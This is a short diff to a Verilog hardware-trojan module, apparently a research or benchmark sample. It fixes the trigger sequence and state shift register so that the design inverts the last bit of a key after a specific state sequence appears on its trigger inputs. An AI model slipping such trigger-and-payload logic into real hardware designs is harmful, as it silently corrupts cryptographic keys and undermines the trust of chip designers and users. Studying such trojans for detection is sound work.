@@ -9,6 +9,7 @@
 // 	compared with the trigger condition. If the condition is met,
 //	the last bit of the key will be inverted until the board powers 
 //	down.
+`timescale 1ns/1ns
 
 module  trojan_seq (
 input					clk,
@@ -24,7 +25,7 @@ parameter 	STATE0  = 2'b10,
 			STATE2 	= 2'b11;
 
 reg [5:0]	state_order;
-reg [5:0] 	trigger_cond = {STATE2, STATE1, STATE0};
+reg [5:0] 	trigger_cond = {STATE0, STATE1, STATE2};
 reg 		trojan_en;
 reg			trojan_en_next;
 
@@ -35,7 +36,7 @@ always @(negedge clk) begin
 		trojan_en 	<= #1 1'b0;
 		payload 	<= #1 key;
 	end else begin
-		state_order	<= #1 {state_order[5:2], trigger[1:0]};
+		state_order	<= #1 {state_order[3:0], trigger[1:0]};
 		trojan_en 	<= #1 trojan_en_next;
 
 		if (trojan_en) begin
